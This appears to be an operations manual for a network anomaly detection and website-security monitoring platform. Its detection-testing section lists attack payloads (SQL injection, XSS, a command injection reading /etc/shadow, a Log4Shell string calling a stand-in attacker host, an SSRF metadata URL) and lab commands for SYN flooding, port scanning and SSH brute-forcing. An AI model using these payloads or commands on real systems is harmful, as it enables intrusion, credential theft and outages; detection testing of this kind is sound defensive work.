# 📘 Network Anomaly Detection (NAD) — Full Step-by-Step Documentation & Operations Manual

Welcome to the comprehensive, step-by-step technical and operational manual for **Network Anomaly Detection (NAD)**. The system is a dual-engine cybersecurity platform combining a real-time **Security Operations Center (SOC) Network Anomaly Detection** system with a **Web Application Security & Continuous Uptime Monitoring Platform (WebSec)**.

---

## 📑 Table of Contents

1. [System Overview & Architecture](#1-system-overview--architecture)
2. [Prerequisites & System Requirements](#2-prerequisites--system-requirements)
3. [Step 1: Environment Setup & Installation](#3-step-1-environment-setup--installation)
4. [Step 2: Machine Learning Model Training](#4-step-2-machine-learning-model-training)
5. [Step 3: Configuration & Environment Variables](#5-step-3-configuration--environment-variables)
6. [Step 4: Launching the Backend Service](#6-step-4-launching-the-backend-service)
7. [Step 5: Launching the Frontend SOC Dashboard](#7-step-5-launching-the-frontend-soc-dashboard)
8. [Step 6: Operating the NAD SOC Console](#8-step-6-operating-the-nad-soc-console)
9. [Step 7: Operating the WebSec Vulnerability & Uptime Platform](#9-step-7-operating-the-websec-vulnerability--uptime-platform)
10. [Step 8: Step-by-Step Attack Simulation & Detection Testing](#10-step-8-step-by-step-attack-simulation--detection-testing)
11. [Step 9: Complete REST API & WebSocket Specification](#11-step-9-complete-rest-api--websocket-specification)
12. [Step 10: Docker & Containerized Deployment](#12-step-10-docker--containerized-deployment)
13. [Step 11: Production Deployment & Live Packet Capture](#13-step-11-production-deployment--live-packet-capture)
14. [Step 12: Troubleshooting & Tuning Guide](#14-step-12-troubleshooting--tuning-guide)

---

## 1. System Overview & Architecture

The system functions using a mental model of **Eyes**, **Brain**, and **Voice**:

```
 ┌────────────────────────────────────────────────────────────────────────┐
 │                              1. THE EYES                               │
 │                                                                        │
 │   [Live NIC Sniffer (Scapy)]      OR      [14-Class Traffic Simulator] │
 └───────────────────────────────────┬────────────────────────────────────┘
                                     │ Raw packet dicts
                                     ▼
 ┌────────────────────────────────────────────────────────────────────────┐
 │                              2. THE BRAIN                              │
 │                                                                        │
 │  ┌─────────────────────────┐          ┌─────────────────────────────┐  │
 │  │ Flow Manager (5-Tuple)  │          │  Signature Engine (30 Rules)│  │
 │  │ Direction-agnostic key  │          │  Sliding windows, tokens    │  │
 │  └────────────┬────────────┘          └──────────────┬──────────────┘  │
 │               │ 41-feature vector                    │ Signature hits  │
 │               ▼                                      │                 │
 │  ┌─────────────────────────┐                         │                 │
 │  │ ML Detection Engine     │                         │                 │
 │  │ IsolationForest+Scaler  │                         │                 │
 │  └────────────┬────────────┘                         │                 │
 │               │ Anomaly score (0.0 - 1.0)            │                 │
 │               └───────────────────┬──────────────────┘                 │
 │                                   ▼                                    │
 │                       ┌───────────────────────┐                        │
 │                       │  Correlation Engine   │                        │
 │                       │  Threat Score (0-100) │                        │
 │                       └───────────┬───────────┘                        │
 └───────────────────────────────────┼────────────────────────────────────┘
                                     │ Correlated Alert
                                     ▼
 ┌────────────────────────────────────────────────────────────────────────┐
 │                              3. THE VOICE                              │
 │                                                                        │
 │  ┌──────────────────┐    ┌────────────────────┐   ┌─────────────────┐  │
 │  │  Alert Manager   │───►│ SQLite Persistence │──►│   REST API      │  │
 │  │  (60s deduplic.) │    │ (data/alerts.db)   │   │  (Port 8000)    │  │
 │  └────────┬─────────┘    └────────────────────┘   └─────────────────┘  │
 │           │                                                            │
 │           └─────────────► 1-second WebSocket ───► React SOC Dashboard  │
 │                           Broadcast (/ws)         (Port 5174/5173)     │
 └────────────────────────────────────────────────────────────────────────┘
```

### Dual-Platform Capabilities
- **Platform 1: Network Anomaly Detection (NAD)**
  - Real-time packet parsing across L2–L7 (Ethernet, ARP, IPv4, TCP, UDP, ICMP, DNS, HTTP).
  - 41 statistical & behavioral flow features (packet lengths, inter-arrival times, flag ratios, entropy, login attempt tracking).
  - 30 signature rules mapped to MITRE ATT&CK techniques with remediation guidance.
  - Machine learning anomaly scoring using Isolation Forest and sequence models.
  - Threat score correlation fusion (0–100 scale).
- **Platform 2: WebSec Platform (Website Security & Uptime Monitoring)**
  - Continuous HTTP/HTTPS availability & response latency tracking.
  - Deep TLS/SSL certificate & cipher suite security audit.
  - Comprehensive HTTP security header assessment (HSTS, CSP, X-Frame-Options, etc.).
  - Cookie security flags, sensitive file/path exposure probing (`.git`, `.env`, backup files).
  - Server banner, tech stack fingerprinting, and downloadable audit JSON reports.

---

## 2. Prerequisites & System Requirements

### Hardware Requirements
- **CPU**: 2 cores minimum (4 cores recommended for live packet capture).
- **RAM**: 2 GB minimum (4 GB recommended).
- **Disk**: 500 MB for code, models, and local SQLite database.

### Software Requirements
- **Operating System**: Linux (Ubuntu 20.04+, Debian 11+, Fedora, Arch, CentOS/RHEL 8+) or macOS. Windows supported via WSL2.
- **Python**: Python 3.10, 3.11, or 3.12 (`python3 --version`).
- **Node.js**: Node.js v18.x or v20.x and npm v9+ (`node -v` and `npm -v`).
- **Optional Tools**:
  - `tcpdump` / `wireshark` for PCAP generation.
  - `nmap`, `hping3`, `curl` for attack simulation.
  - `docker` and `docker-compose` for containerized runs.

---

## 3. Step 1: Environment Setup & Installation

Follow these steps sequentially to set up your environment:

### Step 1.1: Clone & Enter Directory
```bash
cd /home/dereje/project/NAD
```

### Step 1.2: Automatic Setup with `make setup`
The project provides an automated Makefile target that initializes a Python virtual environment and installs both backend and frontend dependencies:
```bash
make setup
```

### Step 1.3: Manual Setup Alternative
If you prefer setting up the components manually without Makefile:

1. **Create and activate the Python virtual environment**:
   ```bash
   python3 -m venv /tmp/nadvenv
   source /tmp/nadvenv/bin/activate
   ```

2. **Install backend Python dependencies**:
   ```bash
   pip install --upgrade pip
   pip install -r requirements.txt
   ```
   *(Backend dependencies include FastAPI, Uvicorn, Scapy, Scikit-learn, NumPy, Pandas, SQLAlchemy, Pydantic, Httpx, and WebSockets).*

3. **Install frontend dependencies**:
   ```bash
   cd frontend
   npm install
   cd ..
   ```

---

## 4. Step 2: Machine Learning Model Training

The ML engine uses an **Isolation Forest** paired with a **StandardScaler** to model normal network flow behavior. Before starting the backend, you need a trained model pickle at `models/hybrid.pkl`.

### Option A: Fast Train on Built-in Synthetic Data (Recommended for first run)
Run:
```bash
make train
```
*Behind the scenes, this executes:*
```bash
/tmp/nadvenv/bin/python train_model.py --model hybrid
```
*Output:*
```
[INFO] Generating synthetic baseline dataset (5000 flows)...
[INFO] Extracting 41 flow features...
[INFO] Training IsolationForest anomaly detector...
[INFO] Model saved successfully to models/hybrid.pkl
```

### Option B: Generate a Custom Synthetic Dataset & Train
You can generate a custom-sized dataset containing specified ratios of normal to malicious flows:
```bash
/tmp/nadvenv/bin/python scripts/generate_dataset.py --flows 10000 --attack-ratio 0.25 --output data/nad_dataset.csv
/tmp/nadvenv/bin/python train_model.py --dataset data/nad_dataset.csv --model hybrid
```

### Option C: Train on Real Benchmark Datasets (CIC-IDS 2017 / UNSW-NB15)
To train on a real-world enterprise capture:
```bash
/tmp/nadvenv/bin/python train_model.py --dataset data/cicids2017.csv --model hybrid
```
The trainer automatically handles column matching against the 41-feature schema and outputs Precision, Recall, and F1 scores at thresholds 0.5 and 0.7.

---

## 5. Step 3: Configuration & Environment Variables

The system uses Pydantic Settings with the `NAD_` prefix. You can configure it via environment variables or a `.env` file in the project root.

### Copy the example configuration:
```bash
cp .env.example .env
```

### Key Configuration Variables

| Variable | Default Value | Description |
|---|---|---|
| `NAD_CAPTURE_MODE` | `simulate` | `simulate` for built-in 14-class traffic generator; `live` for live Scapy NIC sniffing |
| `NAD_INTERFACE` | `lo` | Network interface to sniff when in `live` mode (e.g., `eth0`, `wlan0`, `en0`) |
| `NAD_FLOW_TIMEOUT` | `60` | Idle timeout in seconds before an inactive flow is finalized |
| `NAD_DB_PATH` | `data/alerts.db` | Path to the SQLite alerts and web security database |
| `NAD_MODEL_TYPE` | `hybrid` | Active ML detector (`hybrid`, `isolation_forest`, `lstm`, `transformer`) |
| `NAD_ANOMALY_THRESHOLD`| `0.7` | Anomaly score threshold (0.0 to 1.0) above which an alert is emitted |
| `NAD_WS_BROADCAST_INTERVAL`| `1.0` | Cadence in seconds for WebSocket streaming snapshots |
| `NAD_PORT_SCAN_PORTS` | `15` | Unique destination ports contacted in window to trigger Port Scan alert |
| `NAD_PORT_SCAN_WINDOW`| `60` | Time window (seconds) for port scan aggregation |
| `NAD_SYN_FLOOD_COUNT` | `50` | Incomplete SYN packets per target in 10s window to trigger SYN flood |
| `NAD_BRUTE_FORCE_FAILS`| `10` | Failed authentication attempts in window before brute force alert |
| `NAD_DNS_TUNNEL_LEN` | `53` | Character length threshold for suspicious DNS queries (2x = exfiltration) |
| `NAD_EXFIL_BYTES` | `10000000` | Asymmetric outbound data threshold (10 MB) for exfiltration alert |
| `NAD_SITE_CHECK_DEFAULT_INTERVAL` | `60` | Default interval in seconds for periodic website checks |

---

## 6. Step 4: Launching the Backend Service

### Option 1: Standard Launch via Makefile
```bash
make run
```
This runs Uvicorn on `127.0.0.1:8000`.

### Option 2: Running with Custom Host or Port
```bash
make run HOST=0.0.0.0 PORT=8000
```
Or directly via the virtual environment:
```bash
/tmp/nadvenv/bin/python -m uvicorn backend.main:app --host 0.0.0.0 --port 8000 --reload
```

### Verifying Backend Health
In a separate terminal, test the endpoints:
```bash
curl -s http://127.0.0.1:8000/api/health
```
*Expected response:*
```json
{"status":"ok"}
```

View the interactive Swagger API documentation in your browser at:
**[http://127.0.0.1:8000/docs](http://127.0.0.1:8000/docs)**

---

## 7. Step 5: Launching the Frontend SOC Dashboard

### Step 5.1: Start the Frontend Dev Server
Open a new terminal window:
```bash
cd /home/dereje/project/NAD
make run-frontend
```
Or using npm directly:
```bash
cd frontend
npm run dev
```

### Step 5.2: Open in Browser
Open your browser and navigate to:
**[http://localhost:5174](http://localhost:5174)** *(or http://localhost:5173 if 5174 is occupied)*

Check the top navigation bar:
- **Connection Status Badge**: Should turn from amber `CONNECTING...` to bright green `LIVE`.
- **Packet Throughput Graph**: Should immediately display real-time per-second packet and byte metrics.
- **Alert Stream**: New alerts will populate automatically as packets are processed.

---

## 8. Step 6: Operating the NAD SOC Console

The SOC Console interface is organized into 4 primary views:

### 1. Overview Tab
- **Real-time KPI Tiles**: Total Packets Ingested, Current Packets Per Second (PPS), Active Flows, Critical/High Alert Counter.
- **Live Traffic Bandwidth Chart**: Rolling 60-second throughput visualization showing traffic spikes and anomalies.
- **Protocol Distribution Donut**: Instant breakdown of TCP, UDP, ICMP, ARP, and other protocols.
- **Attack Mix Distribution**: Breakdown of active threat classes detected in the network.
- **Recent Alerts Feed**: Stream of correlated alerts with severity badges, threat scores, and timestamps.

### 2. Alerts Tab
- **Interactive Search**: Filter alerts by source IP, destination IP, attack name, or MITRE technique.
- **Severity Filtering**: Filter by `CRITICAL`, `HIGH`, `MEDIUM`, or `LOW`.
- **Triage Card**: Click on any alert to view:
  - 5-tuple flow metadata (Source/Destination IP and Ports, Protocol).
  - Detection Engine attribution (`signature`, `ml`, or `signature+ml`).
  - Threat Score (0–100) and Confidence rating.
  - MITRE ATT&CK technique reference (e.g., `T1046`, `T1110`, `T1190`).
  - Actionable SOC Remediation recommendation.

### 3. Network Tab
- **Top Talkers**: Ranked list of host IPs consuming the most network bandwidth (bytes and packet count).
- **Top Attack Offenders**: Top source IPs triggering detection alerts.
- **Active Flow Inspector**: Table of all ongoing conversations tracked in the 5-tuple flow table with packet counts and active durations.

### 4. Threat Intel Tab
- **30 Detectors Catalog**: Full list of built-in signature rules, default thresholds, and logic definitions.
- **Threat Matrix**: Heatmap matrix showing attacks across MITRE ATT&CK tactics (Reconnaissance, Initial Access, Execution, Persistence, Credential Access, Lateral Movement, Exfiltration, Impact).

---

## 9. Step 7: Operating the WebSec Vulnerability & Uptime Platform

The system includes a dedicated Website Security & Uptime Platform. Switch to it by clicking **"SWITCH PLATFORM → Web Security"** in the sidebar.

### Step 7.1: Registering a Target Website
1. Click the **"+ Add Site"** button in the WebSec view.
2. Enter the target URL (e.g., `https://example.com`) and a friendly name.
3. Set the monitoring interval (default: 60 seconds).
4. Click **"Save & Run First Audit"**. The scanner immediately probes the target.

### Step 7.2: Running an Instant Ad-hoc Scan
To scan a target on-demand without registering it for periodic monitoring:
1. Use the **Instant Security Scanner** bar at the top of the WebSec platform.
2. Enter any URL and press **"Analyze Now"**.
3. View the instant audit report with security grade and vulnerability findings.

### Step 7.3: Reading the Security Audit Report
Click on any audited site to open the **Comprehensive Security Audit Modal**:
- **Executive Summary**: Security score (0–100) and letter grade (A+, A, B, C, D, F).
- **Uptime & Latency**: HTTP response code, response time in milliseconds, 24-hour uptime percentage.
- **TLS Cryptography**: Certificate issuer, validity period, expiration countdown, TLS protocol version, cipher suite.
- **Security Headers Audit**: Status of HSTS, CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy, COOP, CORP.
- **Vulnerabilities & Findings**: Classified by severity (CRITICAL, HIGH, MEDIUM, LOW, INFO) with CWE, MITRE technique, evidence string, and prescriptive remediation instructions.
- **Export Report**: Click **"Download JSON Report"** to export a formal audit artifact for stakeholders.

---

## 10. Step 8: Step-by-Step Attack Simulation & Detection Testing

You can verify detection capabilities across 5 distinct testing tiers:

### Level 1: One-Shot Smoke Script (5 Seconds)
With the backend running on port 8000:
```bash
make smoke
```
Or:
```bash
bash scripts/smoke.sh 127.0.0.1:8000
```
*Tests all core API endpoints for 200 OK responses.*

### Level 2: Automated Pytest Suite (30 Seconds)
```bash
make test
```
*Runs 6 comprehensive end-to-end and unit tests verifying health, analytics, alert fields, signature engines, and catalog.*

### Level 3: Python REPL Packet Pipeline Trace (No Root Required)
You can trace a simulated attack packet step-by-step through the Python engine without root privileges:

```bash
/tmp/nadvenv/bin/python
```
Paste the following snippet into the REPL:
```python
from backend.flow.flow_manager import FlowManager
from backend.flow.feature_extractor import extract_features
from backend.detection.signature_engine import SignatureEngine
from backend.detection.inference import DetectionEngine
from backend.detection.correlation import correlate

# 1. Initialize components
fm = FlowManager()
sig = SignatureEngine(port_scan_ports=3)
ml = DetectionEngine()

# 2. Simulate 10 SSH brute-force attempts from attacker 9.9.9.9
pkt = {
    "src_ip": "9.9.9.9",
    "dst_ip": "192.168.1.10",
    "src_port": 45678,
    "dst_port": 22,
    "protocol": "TCP",
    "length": 90,
    "flags": "PA",
    "payload_len": 40,
    "dns_query": "",
    "http_payload": "SSH Failed password for invalid user admin"
}

for i in range(10):
    flow = fm.ingest(dict(pkt))
    hits = sig.check_packet(dict(pkt))

# 3. Inspect extracted flow features
features = extract_features(flow)
print("Failed login count in flow:", features["failed_login"])

# 4. Inspect signature detection
print("Signature detector triggered:", [(h["attack_type"], h["severity"]) for h in hits])

# 5. Inspect ML anomaly evaluation
ml_result = ml.analyze_flow(flow)
print("ML Anomaly Score:", ml_result.get("score"))

# 6. Inspect correlation fusion
final_verdict = correlate(hits, ml_result)
print("Correlated Threat Score:", final_verdict["threat_score"])
print("MITRE ATT&CK:", final_verdict["mitre"])
print("Prescriptive Remediation:", final_verdict["remediation"])
```
*Expected output shows `SSH Brute Force` triggered with high severity, MITRE `T1110`, and threat score ~79.*

### Level 4: Simulating Web Exploit Payloads
Trigger web attack detectors using `curl` against your local target or REPL:
- **SQL Injection**: Send `' OR '1'='1` or `UNION SELECT username, password FROM users--`
- **Cross-Site Scripting (XSS)**: Send `<script>alert(document.cookie)</script>`
- **Path Traversal**: Send `../../../../etc/passwd`
- **Command Injection**: Send `; id; cat /etc/shadow`
- **Log4Shell (CVE-2021-44228)**: Send `${jndi:ldap://evil.attacker.com/a}`
- **SSRF**: Send `http://169.254.169.254/latest/meta-data/`

### Level 5: Live Network Lab Attack (Kali Linux against isolated VM)
In an isolated lab environment where the backend is capturing live packets (`make live IFACE=eth0`):
1. **SYN Flood Attack**:
   ```bash
   sudo hping3 -S --flood -p 80 <target-ip>
   ```
2. **Port Scan**:
   ```bash
   nmap -sS -p 1-1000 <target-ip>
   ```
3. **Null Scan & Xmas Scan**:
   ```bash
   nmap -sN <target-ip>   # Null scan
   nmap -sX <target-ip>   # Xmas scan
   ```
4. **SSH Brute Force**:
   ```bash
   hydra -l root -P passwords.txt ssh://<target-ip>
   ```
Observe each attack lighting up in the SOC dashboard within 1 second.

---

## 11. Step 9: Complete REST API & WebSocket Specification

### REST Endpoints Reference

#### Network & Detection Endpoints
- `GET /` — Basic platform status and active detector catalog summary.
- `GET /api/health` — Liveness probe, returns `{"status":"ok"}`.
- `GET /api/stats` — Operational metrics: total packets, current PPS, active/completed flows, alert counts.
- `GET /api/alerts?limit=50` — In-memory recent alerts list (newest first).
- `GET /api/alerts/history?limit=100` — Persistent historical alerts retrieved from SQLite database.
- `GET /api/flows` — Active 5-tuple conversations with packet counters and durations.
- `GET /api/analytics/traffic` — 120-point per-second traffic series, protocol counters, and attack mix.
- `GET /api/analytics/top-talkers?limit=10` — Host IPs sorted by bandwidth and packet consumption.
- `GET /api/catalog` — Detailed catalog of all 30 detectors, MITRE IDs, and remediation instructions.

#### WebSec Endpoints
- `GET /api/sites` — List all registered sites with their latest uptime status and security audit summaries.
- `POST /api/sites` — Register a new website for continuous monitoring (`{"url": "...", "name": "...", "interval": 60}`).
- `DELETE /api/sites/{id}` — Delete a monitored site.
- `PATCH /api/sites/{id}` — Update site parameters (name, interval, enabled state).
- `GET /api/sites/summary` — Aggregate security KPIs across all monitored sites (average security score, up/down count, critical findings).
- `GET /api/sites/{id}/history?limit=288` — Historical uptime and audit log for a specific site.
- `GET /api/sites/{id}/trend?limit=48` — Security score and latency timeline trend data.
- `GET /api/sites/{id}/audit` — Full details of the latest comprehensive security audit for a site.
- `POST /api/sites/{id}/check` or `POST /api/sites/{id}/scan-now` — Trigger an immediate security audit for a registered site.
- `POST /api/sites/scan-all` — Trigger immediate audits across all registered websites concurrently.
- `POST /api/scanner/instant` — Run an ad-hoc, instant security scan on any URL without saving (`{"url": "..."}`).
- `GET /api/sites/{id}/report` — Download a formal, full security audit report as JSON.

### WebSocket Protocol (`ws://HOST:8000/ws`)
1. **Connection Initiation**: Client connects via WebSocket to `/ws`.
2. **Initial Snapshot**: The server immediately sends a `{type: "stats", ...}` message containing current counters, active flows, top talkers, protocols, recent series, and site summaries.
3. **Periodic Broadcast**: Every 1.0 second (configurable via `NAD_WS_BROADCAST_INTERVAL`), the server pushes an updated snapshot.
4. **Instant Alert Push**: Whenever a detection event triggers, an instant message of `{type: "alert", ...alert_payload}` is dispatched immediately without waiting for the 1-second tick.
5. **Keepalive**: Clients should send an empty ping/pong frame or string every 10–15 seconds to keep the socket alive.

---

## 12. Step 10: Docker & Containerized Deployment

The platform includes a complete multi-container setup via `docker-compose.yml`.

### Step 10.1: Build and Launch Containers
```bash
docker-compose up -d --build
```
This starts:
1. **backend**: Python 3.11 container running FastAPI/Uvicorn on port `8000`. Mounts `./models` and `./data` as volumes so trained weights and SQLite databases persist across restarts.
2. **frontend**: Node 20 container serving the React SOC console on port `5174`.

### Step 10.2: Verifying Docker Stack
```bash
docker-compose ps
docker-compose logs -f backend
```

### Step 10.3: Stopping the Stack
```bash
docker-compose down
```

---

## 13. Step 11: Production Deployment & Live Packet Capture

When deploying the system to monitor live physical or virtual network interfaces:

### Step 11.1: Live Capture Command
Live capture requires root privileges because Scapy opens raw sockets in promiscuous mode:
```bash
sudo NAD_CAPTURE_MODE=live NAD_INTERFACE=eth0 /tmp/nadvenv/bin/python -m uvicorn backend.main:app --host 0.0.0.0 --port 8000
```
Or using the Makefile shortcut:
```bash
make live IFACE=eth0 PORT=8000
```

### Step 11.2: Running as a Linux Systemd Service
Create `/etc/systemd/system/nad.service`:
```ini
[Unit]
Description=Network Anomaly Detection Service
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/home/dereje/project/NAD
Environment=NAD_CAPTURE_MODE=live
Environment=NAD_INTERFACE=eth0
Environment=NAD_DB_PATH=/home/dereje/project/NAD/data/alerts.db
ExecStart=/tmp/nadvenv/bin/python -m uvicorn backend.main:app --host 0.0.0.0 --port 8000
Restart=always
RestartSec=5
LimitNOFILE=65535

[Install]
WantedBy=multi-user.target
```
Enable and start the service:
```bash
sudo systemctl daemon-reload
sudo systemctl enable nad
sudo systemctl start nad
sudo systemctl status nad
```

### Step 11.3: Production Nginx Reverse Proxy with WebSocket Support
When placing the service behind Nginx with SSL termination:
```nginx
server {
    listen 80;
    server_name soc.yourdomain.com;
    return 301 https://$host$request_uri;
}

server {
    listen 443 ssl http2;
    server_name soc.yourdomain.com;

    ssl_certificate /etc/letsencrypt/live/soc.yourdomain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/soc.yourdomain.com/privkey.pem;

    # Frontend static files or Vite server
    location / {
        proxy_pass http://127.0.0.1:5174;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }

    # Backend REST API
    location /api/ {
        proxy_pass http://127.0.0.1:8000/api/;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }

    # WebSocket Real-Time Stream
    location /ws {
        proxy_pass http://127.0.0.1:8000/ws;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "Upgrade";
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_read_timeout 86400s;
        proxy_send_timeout 86400s;
    }
}
```

### Step 11.4: Network TAP / SPAN Port Considerations
- **TAP / SPAN**: Connect the monitoring NIC (e.g. `eth0`) to a network switch mirror port (SPAN) or hardware TAP.
- **Promiscuous Mode**: Ensure promiscuous mode is enabled on the sniffing NIC:
  ```bash
  sudo ip link set eth0 promisc on
  ```
- **Encrypted Traffic Note**: Deep payload inspection operates on unencrypted traffic (HTTP, DNS, ARP). For TLS-encrypted traffic, detection relies on statistical flow dynamics (packet frequencies, burst sizes, inter-arrival time distributions, TCP window anomalies) handled by the ML Anomaly Engine.

---

## 13. Step 11: Operating the Universal Connect System & Multi-Computer Telemetry

The platform includes an enterprise **Connect** subsystem supporting **5 input modes**, allowing organizations, university campuses, and lab networks to capture and inspect real computers and network equipment through the unified detection engine.

### Mode 1: Simulator (Demos & Training)
Run 14 realistic cyber attack classes with configurable intensity:
```bash
# Start backend in simulator mode with custom intensity
make run MODE=demo
# Or via environment:
AEGIS_MODE=simulate AEGIS_INTENSITY=high make run
```
In the UI, click **Connect & Ingest** to toggle intensity (*Low, Medium, High, Stress*) and selectively enable/disable specific attack classes.

### Mode 2: This Computer (Local NIC Sniffing)
Capture live traffic directly from physical, Wi-Fi, or loopback network cards:
```bash
make live IFACE=eth0
# Or using CAP_NET_RAW capability without full root:
sudo setcap cap_net_raw,cap_net_admin=eip $(which python3)
make run MODE=live IFACE=eth0
```
- Open the **Connect & Ingest** tab in the SOC console.
- Select your interface from the dropdown (shows IP, MAC, carrier status, and packets seen).
- Optionally specify a BPF filter (e.g. `tcp and not port 22 and not port 8000`).
- Click **Start Live Capture**.

### Mode 3: Upload PCAP Replay
Replay historical Wireshark captures (`.pcap` / `.pcapng` up to 100MB) through all 30 detectors and ML:
```bash
make run MODE=pcap FILE=data/sample.pcap
```
Or drag-and-drop the PCAP file in the **Upload PCAP File** card in the dashboard. Select playback speed (*Instant*, *Realtime*, *5x*, *10x*) and monitor progress in real-time.

### Mode 4: Switch Mirror Port / Network TAP
Mirror traffic from enterprise switches directly into the monitoring listening interface:

#### Cisco Catalyst / Nexus SPAN Configuration:
```cisco
configure terminal
monitor session 1 source interface GigabitEthernet 0/1 - 24 both
monitor session 1 destination interface GigabitEthernet 0/48
end
```

#### MikroTik RouterOS Port Mirror:
```routeros
/interface ethernet switch
set mirror-source=ether1 mirror-target=ether5
```

#### Ubiquiti UniFi / EdgeSwitch:
```bash
configure
set interfaces ethernet eth0 mirror eth1
commit
```

#### Linux Bridge / Open vSwitch (`tc mirror`):
```bash
sudo ip link set dev eth1 promisc on
sudo tc qdisc add dev eth0 ingress
sudo tc filter add dev eth0 parent ffff: matchall action mirred egress mirror dev eth1
```

#### 10-Second Link Verification:
In the UI under **Mirror Port / Switch SPAN**, click **10s Link Test**. The system will sniff packets for 10 seconds and report whether packets are actively arriving or provide an exact troubleshooting fix.

### Mode 5: Remote Multi-Computer Agents (Universities & Organizations)
Deploy lightweight agents to external computers, university lab machines, and branch servers:

```bash
# 1. Generate an endpoint token in UI or via API:
curl -X POST http://127.0.0.1:8000/api/agents/tokens \
  -H "Content-Type: application/json" \
  -d '{"name": "Lab-PC-01", "site": "Computer Science Lab 3"}'

# 2. One-line terminal install on any target computer:
curl -sSL http://<SERVER_IP>:8000/api/agents/install.sh | bash -s -- <TOKEN> "Computer Science Lab 3" "Lab-PC-01"

# 3. Or manually with the agent script:
python3 scripts/aegis-agent.py --server http://<SERVER_IP>:8000 --token <TOKEN> --site "Lab 3"
```
The agent captures local network flow metadata (without sensitive internal payload contents), encrypts telemetry, and streams it to the central SOC console. All connected computers appear live under the **Connected Computers** tab!

---

## 14. Step 12: Troubleshooting & Tuning Guide

### Common Issues & Solutions

| Symptom | Probable Cause | Exact Solution |
|---|---|---|
| `/tmp/nadvenv/bin/python: No such file` | Virtual environment not created | Run `make setup` or `python3 -m venv /tmp/nadvenv && pip install -r requirements.txt` |
| `Address already in use: 8000` | Another process is holding port 8000 | Find and kill it: `fuser -k 8000/tcp` or start on another port: `make run PORT=8001` |
| Dashboard says `CONNECTING...` indefinitely | Backend is not running or WS is blocked | Check backend logs, verify `curl http://127.0.0.1:8000/api/health`, ensure firewall allows port 8000 |
| `models/hybrid.pkl not found` | Model was not trained before launch | Run `make train` to generate the default model pickle |
| `Permission denied` on `make live` | Live packet capture requires root | Prepend `sudo` or run `make live IFACE=<your_nic>` |
| Frontend displays blank page or build error | Node dependencies outdated or missing | Run `cd frontend && npm install && npm run build` to verify clean build |

### Tuning False Positives & Alert Fatigue
- **Too many Port Scan alerts on busy servers?**
  Increase threshold: `export NAD_PORT_SCAN_PORTS=30` and `export NAD_PORT_SCAN_WINDOW=30`.
- **Benign traffic triggering ML Anomaly?**
  Raise threshold: `export NAD_ANOMALY_THRESHOLD=0.85` in `.env`.
- **SYN Flood triggering on normal web traffic spikes?**
  Increase count: `export NAD_SYN_FLOOD_COUNT=150`.
- **DDoS alert triggering prematurely?**
  Set `export NAD_DDOS_PPS=5000` to reflect your baseline network capacity.

---

## 🏁 Summary Checklist

1. [x] **Setup**: `make setup`
2. [x] **Train Model**: `make train`
3. [x] **Start Backend**: `make run`
4. [x] **Start Frontend**: `make run-frontend`
5. [x] **Verify**: Open `http://localhost:5174`, run `make test`, and execute a smoke check with `make smoke`.
